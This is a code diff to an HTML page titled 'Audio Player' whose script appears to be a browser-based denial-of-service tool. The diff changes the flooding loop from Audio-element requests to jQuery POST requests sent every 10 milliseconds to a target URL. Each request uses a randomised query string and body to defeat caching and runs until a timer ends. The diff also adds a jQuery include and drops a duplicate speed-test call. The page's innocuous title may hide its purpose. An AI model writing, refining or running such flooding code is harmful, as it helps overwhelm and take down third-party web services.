@@ -5,6 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Audio Player</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
 </head>
 
 <body>
@@ -30,14 +32,21 @@
 
         function createThread(target, timeout) {
 
-            const timer = setInterval(() => new Audio(`${target}?${randomString(10)}=${randomString(20)}`))
+            const timer = setInterval(function () {
+
+                $.ajax({
+                    method: "POST",
+                    url: `${target}?${randomString(10)}=${randomString(20)}`,
+                    data: randomString(20),
+                    timeout: 1
+                })
+
+            }, 10)
 
             setTimeout(() => clearInterval(timer), timeout * 1000)
         }
 
         async function run(target, duration, started_at, start) {
-
-            testSpeed(target, duration, started_at).catch(_ => undefined)
 
             testSpeed(target, duration, started_at).catch(_ => undefined)
 
